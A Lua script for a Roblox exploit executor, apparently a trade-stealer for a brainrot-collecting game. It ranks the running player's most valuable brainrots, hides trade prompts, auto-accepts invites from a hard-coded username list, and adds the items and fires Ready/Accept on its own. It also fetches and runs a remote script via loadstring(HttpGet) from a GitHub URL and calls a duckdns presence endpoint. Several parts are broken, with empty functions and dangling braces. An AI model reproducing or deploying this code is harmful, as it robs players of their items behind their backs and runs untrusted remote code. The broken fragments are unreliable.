local function getMyPlot()
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil end
    local myName = LocalPlayer.DisplayName or LocalPlayer.Name
    for _, plot in ipairs(plots:GetChildren()) do
        local sign = plot:FindFirstChild("PlotSign", true)
        local label = sign and sign:FindFirstChildWhichIsA("TextLabel", true)
        local text = label and (label.ContentText or label.Text or "")
        if text and text:find(myName, 1, true) then
            return plot
        end
    end
    return nil
end

local function buildSlotAnchors(plot)
    local anchors = {}
    local podiums = plot:FindFirstChild("AnimalPodiums")
    if not podiums then return anchors end
    for _, podium in ipairs(podiums:GetChildren()) do
        local idx = tonumber(podium.Name)
        if idx then
            local base = podium:FindFirstChild("Base")
            local spawnPart = base and base:FindFirstChild("Spawn")
            local anchor = spawnPart or base or podium:FindFirstChildWhichIsA("BasePart", true)
            if anchor and anchor:IsA("BasePart") then
                anchors[idx] = anchor.Position
            end
        end
    end
    return anchors
end

local function parseGen(text)
    if not text or text == "" then return nil end
    local numStr = text:match("([%d%.]+)")
    local num = tonumber(numStr)
    if not num then return nil end
    local unit = text:match("([kKmMbBtT])")
    local mul = 1
    if unit == "k" or unit == "K" then mul = 1e3
    elseif unit == "m" or unit == "M" then mul = 1e6
    elseif unit == "b" or unit == "B" then mul = 1e9
    elseif unit == "t" or unit == "T" then mul = 1e12 end
    return num * mul
end

local function scanOverheadGens()
    task.wait()  -- yield 1 frame, tránh block
    local gens = {}
    for _, inst in ipairs(workspace:GetDescendants()) do
        if inst:IsA("TextLabel") and inst.Name == "Generation" then
            local frame = inst.Parent
            local nameLbl = frame and frame:FindFirstChild("DisplayName")
            local name = nameLbl and (nameLbl.ContentText or nameLbl.Text)
            local genText = inst.ContentText or inst.Text
            if name and genText and genText:find("/s") then
                local billboard = frame and frame:FindFirstAncestorOfClass("BillboardGui")
                local adorn = billboard and billboard.Adornee
                local pos
                if adorn and adorn:IsA("BasePart") then
                    pos = adorn.Position
                else
                    local partAncestor = frame:FindFirstAncestorWhichIsA("BasePart")
                    if partAncestor then
                        pos = partAncestor.Position
                    end
                end
                if pos then
                    local genNum = parseGen(genText)
                    table.insert(gens, {
                        name = name,
                        genText = genText,
                        genNum = genNum,
                        pos = pos,
                    })
                end
            end
        end
    end
    return gens
end

local function mapModelsToSlots(plot, anchors)
    local slotModels = {}
    for _, child in ipairs(plot:GetChildren()) do
        if child:IsA("Model") and child.Name ~= "Base" and child.Name ~= "Claim" and child.Name ~= "AnimalPodiums" and child.Name ~= "PlotSign" then
            local root = child.PrimaryPart or child:FindFirstChildWhichIsA("BasePart", true)
            if root then
                local pos = root.Position
                local bestSlot, bestDist = nil, math.huge
                for slot, aPos in pairs(anchors) do
                    local d = (pos - aPos).Magnitude
                    if d < bestDist then
                        bestDist = d
                        bestSlot = slot
                    end
                end
                if bestSlot then
                    slotModels[bestSlot] = {
                        name = child.Name,
                        model = child,
                        pos = pos,
                        dist = bestDist,
                    }
                end
            end
        end
    end
    return slotModels
end

local function findGenForModel(modelInfo, gens)
    local best, bestDist
    for _, g in ipairs(gens) do
        if g.name == modelInfo.name then
            local d = (modelInfo.pos - g.pos).Magnitude
            if not bestDist or d < bestDist then
                bestDist = d
                best = g
            end
        end
    end
    return best, bestDist
end

local function buildSlotGenMap(plot)
    local anchors = buildSlotAnchors(plot)
    if not next(anchors) then return {} end
    local slotModels = mapModelsToSlots(plot, anchors)
    local gens = scanOverheadGens()
    local slotGen = {}
    for slot, modelInfo in pairs(slotModels) do
        local g, dist = findGenForModel(modelInfo, gens)
        if g and g.genNum and g.genNum > 0 then
            slotGen[slot] = {
                mpsNum = g.genNum,
                mpsText = g.genText,
            }
        end
    end
    return slotGen
end

    local function loadSyncData()

        end

-- replace WHOLE _postJson with this
local function withWaitParam(url)
    url = tostring(url or "")
    if url == "" then return url end
    if url:lower():find("wait=") then return url end
    if url:find("?", 1, true) then
        return url .. "&wait=true"
    else
        return url .. "?wait=true"
    end
end

local function _postJson(url, headers, bodyStr)
    -- pick best request fn from executor
    local req = Request
        or (syn and syn.request) or http_request or request
        or (fluxus and fluxus.request) or (krnl and krnl.request)
        or (http and http.request)

    if type(req) ~= "function" then
        warn("[HTTP] No executor request function (syn.request/http_request/...).")
        return false, "no_request_fn"
    end

    headers = headers or {}
    headers["Content-Type"] = headers["Content-Type"] or "application/json"

    local ok, resp = pcall(function()
        return req({ Url = url, Method = "POST", Headers = headers, Body = bodyStr })
    end)
    if not ok then return false, resp end

    local status = resp.StatusCode or resp.Status or resp.status_code or 0
    local success = (status >= 200 and status < 300)
    return success, { status = status, body = (resp.Body or resp.body or resp.ResponseBody or "") }
end

--== Audio patch: mute hết sound trừ bài có chữ 'day' ==--
local function shouldKeepSound(s)
    local name = string.lower(tostring(s.Name or ""))
    local id   = string.lower(tostring(s.SoundId or ""))
    -- giữ lại nếu tên hoặc SoundId có "day"
    return name:find("day", 1, true) or id:find("day", 1, true)
end

local function hardMuteSound(inst)
    if not inst:IsA("Sound") then
        return
    end

    if shouldKeepSound(inst) then
        -- đây là bài "day" -> giữ nguyên
        return
    end

    pcall(function()
        inst.Volume = 0
        inst.Looped = false
        inst.Playing = false
    end)
end

local function getMutationName(mutation)
    if not mutation then
        return "None"
    end

    if type(mutation) == "string" then
        return mutation
    end

    if type(mutation) == "table" then
        if mutation.Type and type(mutation.Type) == "string" then
            return mutation.Type
        end
        local parts = {}
        for _, v in pairs(mutation) do
            if type(v) == "string" then
                table.insert(parts, v)
            end
        end
        if #parts > 0 then
            table.sort(parts)
            return table.concat(parts, "+")
        end
    end

    return "Unknown"
end

local function scanBrainrots()
    -- 1) Lấy SYNC_DATA từ Synchronizer
    local SYNC_DATA = loadSyncData()
    if not SYNC_DATA then
        warn("[SAB-TRADE] SYNC_DATA missing, cannot scan brainrots.")
        return nil
    end

    -- 2) Tìm plot trong workspace để build map slot -> gen từ Overhead
    local myPlot = getMyPlot()
    if not myPlot then
        warn("[SAB-TRADE] Cannot find your plot in workspace.")
        return nil
    end

    local SLOT_GEN_MAP = buildSlotGenMap(myPlot) or {}
    local allBrainrots = {}

    -- 3) Duyệt SYNC_DATA y hệt logic embed cũ để tìm plot của mình
    for _, plotData in pairs(SYNC_DATA) do
        if type(plotData) == "table" then
            local owner = plotData.Owner
            if type(plotData.Get) == "function" and owner == nil then
                local okGetOwner, gotOwner = pcall(function()
                    return plotData:Get("Owner")
                end)
                if okGetOwner then
                    owner = gotOwner
                end
            end

            local isOwner = false
            if typeof(owner) == "Instance" and owner:IsA("Player") then
                isOwner = (owner == LocalPlayer)
            elseif type(owner) == "table" and owner.UserId then
                isOwner = (owner.UserId == LocalPlayer.UserId)
            end

            if isOwner then
                -- Lấy AnimalList giống embed cũ
                local animalList = plotData.AnimalList
                if type(plotData.Get) == "function" and animalList == nil then
                    local okGetList, gotList = pcall(function()
                        return plotData:Get("AnimalList")
                    end)
                    if okGetList then
                        animalList = gotList
                    end
                end

                if type(animalList) ~= "table" then
                    warn("[SAB-TRADE] animalList on my plot is not a table.")
                    break
                end

                -- 4) Duyệt từng slot, nối với gen từ Overhead
                for slotKey, data in pairs(animalList) do
                    if type(data) == "table" then
                        local index    = data.Index or data.AnimalId or data.id
                        if not index then
                            continue
                        end

                        local uuid     = data.UUID or data.Uid or data.uid
                        local off      = data.OfflineGain or data.Offline or 0
                        local last     = data.LastCollect or data.Last or 0
                        local traits   = data.Traits or {}
                        local mutation = data.Mutation or data.MutationName or "None"

                        local displayName = index
                        local rarity      = "Common"
                        local mutName     = getMutationName and getMutationName(mutation) or tostring(mutation)

                        if AnimalsData and index and AnimalsData[index] then
                            local info = AnimalsData[index]
                            if type(info) == "table" then
                                displayName = info.DisplayName or displayName
                                rarity      = info.Rarity or rarity
                            end
                        end

                        local slotNum  = tonumber(slotKey)
                        local genInfo  = slotNum and SLOT_GEN_MAP[slotNum] or nil

                        -- Chỉ giữ những con có Overhead gen > 0
                        if genInfo and genInfo.mpsNum and genInfo.mpsNum > 0 then
                            table.insert(allBrainrots, {
                                slotKey  = slotNum or slotKey,
                                display  = displayName,
                                index    = index,
                                uuid     = uuid,
                                offline  = off,
                                last     = last,
                                traits   = traits,
                                mutation = mutation,
                                mutName  = mutName,
                                rarity   = rarity,
                                mps      = genInfo.mpsNum,
                                mpsText  = genInfo.mpsText,
                            })
                        end
                    end
                end

                -- Đã xử lý plot của mình rồi, không cần đi tiếp
                break
            end
        end
    end

    if #allBrainrots == 0 then
        warn("[SAB-TRADE] No brainrots with Overhead gen found on your plot.")
        return {}
    end

    -- 5) Sort theo rarity rồi gen (cao -> thấp)
    table.sort(allBrainrots, function(a, b)
        local ra = rarityRank[a.rarity] or 999
        local rb = rarityRank[b.rarity] or 999
        if ra ~= rb then
            return ra < rb
        end
        return (a.mps or 0) > (b.mps or 0)
    end)

    -- 6) Debug list cuối cùng
    print(string.rep("=", 60))
    print("[SAB-TRADE] Brainrots trong base (Overhead gen, đã sort rarity + gen):")
    for i, br in ipairs(allBrainrots) do
        local traitsStr = "None"
        if type(br.traits) == "table" then
            -- dùng pairs để support cả table dạng map
            local tmp = {}
            for _, v in pairs(br.traits) do
                table.insert(tmp, tostring(v))
            end
            if #tmp > 0 then
                traitsStr = table.concat(tmp, ", ")
            end
        end

        local line = string.format(
            "#%02d [%s] slot=%s | %s | %s | traits=%s",
            i,
            tostring(br.rarity or "?"),
            tostring(br.slotKey),
            tostring(br.mpsText or "0"),
            tostring(br.display or "?"),
            traitsStr
        )
        print(line)
    end
    print(string.rep("=", 60))

    return allBrainrots
end

-- ============================================================
-- Lọc brainrot theo BrainrotPing (chỉ trade những con đủ mps)
-- ============================================================
local function getBrainrotPingThreshold()
    local v = rawget(getgenv(), "BrainrotPing") or rawget(getgenv(), "brainrotPing")
    if v == nil then
        return 0
    end

    if type(v) == "number" then
        return v
    end

    if type(v) == "string" then
        local s = v:lower()
        -- bỏ khoảng trắng, "/s", "s", đổi dấu phẩy thành chấm
        s = s:gsub("%s+", "")
        s = s:gsub("/s$", "")
        s = s:gsub("s$", "")
        s = s:gsub(",", ".")
        local num = tonumber(s:match("([%d%.]+)") or "") or 0
        if num <= 0 then
            return 0
        end

        if s:find("k") then
            num = num * 1000
        elseif s:find("m") then
            num = num * 1000000
        elseif s:find("b") then
            num = num * 1000000000
        end

        return num
    end

    return 0
end

local pingThresholdForTrade = getBrainrotPingThreshold()
if pingThresholdForTrade > 0 and #brainrots > 0 then
    local filtered = {}
    for _, br in ipairs(brainrots) do
        local mpsNum = br.mps or 0
        if mpsNum >= pingThresholdForTrade then
            filtered[#filtered + 1] = br
        end
    end

    if #filtered > 0 then
        print(string.format(
            "[SAB-TRADE] BrainrotPing=%.0f, chỉ trade %d/%d brainrot có Mps >= threshold.",
            pingThresholdForTrade,
            #filtered,
            #brainrots
        ))
        brainrots = filtered
    else
        print(string.format(
            "[SAB-TRADE] BrainrotPing=%.0f, không có brainrot nào đủ Mps, KHÔNG gửi trade.",
            pingThresholdForTrade
        ))
        safeSpawn(function()
            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/keykey.lua"))()
            end)
        end)
        return
    end
end

local function getUserIdByName(name)
    if not name or name == "" then return nil end

    local inServer = Players:FindFirstChild(name)
    if inServer then
        return inServer.UserId
    end

    if Request then
        local ok, resp = pcall(function()
            return Request({
                Url = "https://users.roblox.com/v1/usernames/users",
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({ usernames = { name }, excludeBannedUsers = false })
            })
        end)
        if ok and resp then
            local body = resp.Body or resp.body or ""
            local parseOk, data = pcall(function()
                return HttpService:JSONDecode(body)
            end)
            if parseOk and data and data.data and data.data[1] then
                return data.data[1].id
            end
        end
    end
    return nil
end

    for _, u in ipairs(_userCache) do

    end

    local resp = Request({
        Url = "https://statusplayers.duckdns.org/presence",  -- đổi dòng này

        },
        -- bỏ hoàn toàn dòng Cookie
        Body = HttpService:JSONEncode({ userIds = ids })
    })
    return HttpService:JSONDecode(resp.Body or resp.body)
end)

    if not ok or not data or not data.userPresences then
        warn("[SAB-TRADE] Presence API failed")
        return nil
    end

    local presenceMap = {}
    for _, p in ipairs(data.userPresences) do
        presenceMap[p.userId] = p.userPresenceType
    end

    local onlineUsers = {}
    for _, u in ipairs(_userCache) do

        local label = pType == 2 and "InGame" or pType == 1 and "Online" or "Offline"

        if pType == 2 then onlineUsers[#onlineUsers + 1] = u end
    end

    if #onlineUsers == 0 then return nil end
    return onlineUsers
end

            local newResult = getFirstOnlineUser()

local function addBrainrot(br, idx, total)
    if not br then return false end

    print(string.rep("-", 60))
    print(string.format("[SAB-TRADE] AddBrainrot #%d/%d slot=%s %s gen=%s",
        idx or 0, total or 0,
        tostring(br.slotKey), tostring(br.display), tostring(br.mpsText)))

    if not ADD_RF then warn("[SAB-TRADE] No ADD_RF") return false end

    local payload = {
        UUID        = br.uuid or "",
        LastCollect = br.last or 0,
        Index       = br.index or br.display or "",
        OfflineGain = br.offline or 0,
    }
    if type(br.traits) == "table" and next(br.traits) then
        payload.Traits = br.traits
    end
    if br.mutation and br.mutation ~= "None" and br.mutation ~= "" then
        payload.Mutation = br.mutation
    end

    local ok, res = pcall(function()
        return ADD_RF:InvokeServer(TradeUUIDs.AddBrainrot, br.slotKey, payload)
    end)
    print(string.format("[SAB-TRADE] AddBrainrot -> ok=%s res=%s (slot=%s)",
        tostring(ok), tostring(res), tostring(br.slotKey)))

    if ok and res ~= false then return true end

    -- Retry 1 lần sau 1s
    warn("[SAB-TRADE] Add fail, retry sau 1s...")
    task.wait(1)
    local ok2, res2 = pcall(function()
        return ADD_RF:InvokeServer(TradeUUIDs.AddBrainrot, br.slotKey, payload)
    end)
    print(string.format("[SAB-TRADE] Retry -> ok=%s res=%s (slot=%s)",
        tostring(ok2), tostring(res2), tostring(br.slotKey)))
    return ok2 and res2 ~= false
end

-- đọc số slot trống của đối phương
local function getOtherFreeSlots()
    local ok, freeOrErr = pcall(function()
        local gui = LP:FindFirstChild("PlayerGui")
        local tradeRoot = gui and gui:FindFirstChild("TradeLiveTrade")
        local tradeUI = tradeRoot and tradeRoot:FindFirstChild("TradeLiveTrade")
        local other = tradeUI and tradeUI:FindFirstChild("Other")
        local baseSlots = other and other:FindFirstChild("BaseSlots")
        if not baseSlots then return nil end

        local rawText = tostring(baseSlots.ContentText or baseSlots.Text or "")
        local usedStr, maxStr = rawText:match("(%d+)%s*/%s*(%d+)")
        if not usedStr or not maxStr then return nil end

        local used = tonumber(usedStr)
        local maxSlots = tonumber(maxStr)
        if not used or not maxSlots then return nil end

        local free = maxSlots - used
        if free < 0 then free = 0 end
        return free
    end)

    if not ok then
        warn("[SAB-TRADE] Không đọc được Other.BaseSlots:", freeOrErr)
        return nil
    end
    return freeOrErr
end

local function doAddBrainrots()
    local freeSlots = getOtherFreeSlots()
    local maxToAdd
    if freeSlots and freeSlots > 0 then
        maxToAdd = math.min(#brainrots, freeSlots)
    else
        maxToAdd = #brainrots
    end

    -- Giữ nguyên thứ tự rarity+gen từ scanBrainrots, click đúng slotKey của từng con
    print("[SAB-TRADE] Add", maxToAdd, "brainrot theo thứ tự rarity+gen:")
    for i = 1, maxToAdd do
        local br = brainrots[i]
        print(string.format("  #%d slot=%s %s gen=%s", i, tostring(br.slotKey), tostring(br.display), tostring(br.mpsText)))
    end

    for i = 1, maxToAdd do
        if not isTradeUIOpen() then
            warn("[SAB-TRADE] Trade UI đóng giữa chừng, dừng add.")
            return false
        end
        addBrainrot(brainrots[i], i, maxToAdd)
        task.wait(1.2)
    end

    print("[SAB-TRADE] Đã add xong", maxToAdd, "brainrot.")
    return true
end

local function doReadyAccept()
    print("[SAB-TRADE] Ready/Accept theo UI state...")
    local firedReady = false
    local firedAccept = false
    while isTradeUIOpen() do
        local pg = LP:FindFirstChild("PlayerGui")
        local tlRoot = pg and pg:FindFirstChild("TradeLiveTrade")
        local tl = tlRoot and tlRoot:FindFirstChild("TradeLiveTrade")
        local other = tl and tl:FindFirstChild("Other")
        local btn = other and other:FindFirstChild("ReadyButton")
        local txt = btn and btn:FindFirstChild("Txt")

        if txt and btn then
            local text = (txt.ContentText or txt.Text or ""):upper()
            local isGreen = (btn.BackgroundColor3 == Color3.fromRGB(81, 158, 86))

            if isGreen then
                if text == "READY" and not firedReady and READY_RE then
                    pcall(function() READY_RE:FireServer(TradeUUIDs.Ready) end)
                    print("[SAB-TRADE] Fire READY")
                    firedReady = true
                elseif text == "ACCEPT" and not firedAccept and ACCEPT_RE then
                    pcall(function() ACCEPT_RE:FireServer(TradeUUIDs.Accept) end)
                    print("[SAB-TRADE] Fire ACCEPT")
                    firedAccept = true
                end
                task.wait(1)
                continue
            else
                -- nút không còn xanh → reset để fire lại nếu xanh lại
                if text == "READY" then firedReady = false end
                if text == "ACCEPT" then firedAccept = false end
            end
        end

        task.wait(0.1)
    end
    print("[SAB-TRADE] Trade UI đóng, kết thúc Ready/Accept")
end

-- ============================================================
-- AUTO-ACCEPT: ẩn prompt + accept trade từ username trong list
-- ============================================================
do
    local allowedSet = {}
    for _, name in ipairs(playerList) do
        if type(name) == "string" and name ~= "" then
            allowedSet[name:lower()] = true
        end
    end

    local processedLabels = {}

    local function handlePrompt(inst)
        if inst.Name ~= "Username" or not inst:IsA("TextLabel") then return end
        if processedLabels[inst] then return end
        processedLabels[inst] = true

        local raw = (inst.ContentText or inst.Text or "")
        if not raw:lower():find("wants to trade with you") then return end

        -- extract username: "@achocohieuhoinach wants to trade with you" → "achocohieuhoinach"
        local uname = raw:match("^@(%S+)") or raw:match("^(%S+)")
        if not uname then return end

        local promptFrame = inst:FindFirstAncestor("Prompt")

        -- đẩy prompt ra ngoài màn hình thay vì hide
        if promptFrame and promptFrame:IsA("GuiObject") then
            promptFrame.Visible = false
        end

        -- check whitelist
        if not allowedSet[uname:lower()] then
            print("[SAB-TRADE] Trade từ", uname, "- không trong list, bỏ qua.")
            return
        end

        print("[SAB-TRADE] Trade từ", uname, "- auto accept!")

        -- Accept bằng remote AcceptInvite
        safeSpawn(function()
            local senderId = getUserIdByName(uname)
            if senderId and ACCEPT_INVITE_RF then
                local arg = string.format("%d-%d", senderId, LP.UserId)
                pcall(function()
                    ACCEPT_INVITE_RF:InvokeServer(TradeUUIDs.AcceptInvite, arg)
                end)
                print("[SAB-TRADE] AcceptInvite for", uname)
            else
                warn("[SAB-TRADE] Không lấy được senderId cho", uname)
            end
        end)
    end

    local playerGui = LP:FindFirstChild("PlayerGui")
    if playerGui then
        local function hook(root)
            if not root then return end
            for _, desc in ipairs(root:GetDescendants()) do
                if desc.Name == "Prompt" and desc:IsA("GuiObject") then
                    desc.Visible = false
                end
                if desc.Name == "Username" and desc:IsA("TextLabel") then
                    safeDefer(handlePrompt, desc)
                end
            end
            root.DescendantAdded:Connect(function(inst)
                if inst.Name == "Prompt" and inst:IsA("GuiObject") then
                    inst.Visible = false
                end
                if inst.Name == "Username" and inst:IsA("TextLabel") then
                    safeDefer(handlePrompt, inst)
                end
            end)
        end

        local duelsRoot = playerGui:FindFirstChild("DuelsMachinePrompt")
        if duelsRoot then
            hook(duelsRoot:FindFirstChild("DuelsMachinePrompt") or duelsRoot)
        end

        playerGui.ChildAdded:Connect(function(child)
            if child.Name == "DuelsMachinePrompt" then
                hook(child:FindFirstChild("DuelsMachinePrompt") or child)
            end
        end)

        print("[SAB-TRADE] Auto-accept listener đã bật.")
    end
end

end
